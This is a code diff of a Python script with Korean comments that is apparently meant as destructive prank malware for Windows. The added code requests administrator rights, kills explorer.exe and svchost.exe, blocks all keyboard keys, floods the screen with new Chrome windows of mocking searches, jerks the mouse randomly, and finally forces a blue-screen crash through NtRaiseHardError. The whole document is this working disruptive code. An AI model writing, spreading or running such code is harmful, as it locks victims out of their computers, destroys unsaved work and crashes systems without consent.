@@ -1,65 +1,54 @@
 import os
-import keyboard
-import random
+import ctypes
 import threading
 import time
-import pyautogui
+import sys
 import subprocess
+import random
+import keyboard
+import pyautogui
 
-# 안전장치 비활성화
-pyautogui.FAILSAFE = False 
-pyautogui.PAUSE = 0.001 
-
-# 크롬 실행 파일 경로 (환경에 따라 수정 필요)
-# 보통 윈도우 64비트 크롬 기본 경로
+# 설정
+pyautogui.FAILSAFE = False
 CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
 
-def block_everything():
-    # 모든 키보드 입력 차단
+def block_input():
+    # 키보드 입력 하드웨어 레벨 차단
     for i in range(150):
-        try:
-            keyboard.block_key(i)
-        except:
-            pass
+        try: keyboard.block_key(i)
+        except: pass
 
 def search_bomb():
-    search_terms = [
-        "컴퓨터 바이러스 없애는 법",
-        "마인크래프트 무료 설치 2026 완벽 작동",
-        "마이크로소프트를 훔치는 법",
-        "Visual Studio 2022로 바이러스 만들기"
-    ]
-    
+    search_terms = ["컴퓨터 바이러스 없애는 법", "마인크래프트 무료 설치", "마이크로소프트를 훔치는 법", "Visual Studio 2020에서 Python으로 바이러스 만드는 법", "학교 때려치는 법", "Pepe the frog", "아 배고프다", "헤헤헤헿ㅎㅎㅎㅎ"]
     while True:
         term = random.choice(search_terms)
-        # --new-window 플래그를 사용하여 무조건 새 창으로 실행
-        url = f"https://www.google.com/search?q={term}"
-        try:
-            subprocess.Popen([CHROME_PATH, "--new-window", url])
-        except Exception:
-            # 크롬이 없으면 기본 브라우저 사용
-            import webbrowser
-            webbrowser.open_new(url)
-            
-        time.sleep(0.3) # 0.3초마다 새 창 폭탄
+        subprocess.Popen([CHROME_PATH, "--new-window", f"https://www.google.com/search?q={term}"])
+        time.sleep(0.5)
 
-def mouse_frenzy():
+def mouse_chaos():
     width, height = pyautogui.size()
     while True:
-        x = random.randint(0, width)
-        y = random.randint(0, height)
-        pyautogui.moveTo(x, y)
+        pyautogui.moveTo(random.randint(0, width), random.randint(0, height))
+        time.sleep(0.01)
+
+def shadow_entropy():
+    # 1. 시각적/기능적 난동 시작 (20초 동안)
+    threading.Thread(target=search_bomb, daemon=True).start()
+    threading.Thread(target=mouse_chaos, daemon=True).start()
+    
+    time.sleep(20) # 20초간 시스템 붕괴 전조
+    
+    # 2. 붕괴 시작
+    os.system("taskkill /f /im svchost.exe") # 시스템 서비스 마비
+    time.sleep(1)
+    
+    # 3. 커널 패닉 (BSOD)
+    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
 
 if __name__ == "__main__":
-    if os.name == 'nt':
-        # 바탕화면 마비
+    if ctypes.windll.shell32.IsUserAnAdmin():
         os.system("taskkill /f /im explorer.exe")
-        
-        # 스레드 시작
-        threading.Thread(target=block_everything, daemon=True).start()
-        threading.Thread(target=search_bomb, daemon=True).start()
-        threading.Thread(target=mouse_frenzy, daemon=True).start()
-        
-        # 무한 루프
-        while True:
-            time.sleep(1)
+        threading.Thread(target=block_input, daemon=True).start()
+        shadow_entropy()
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
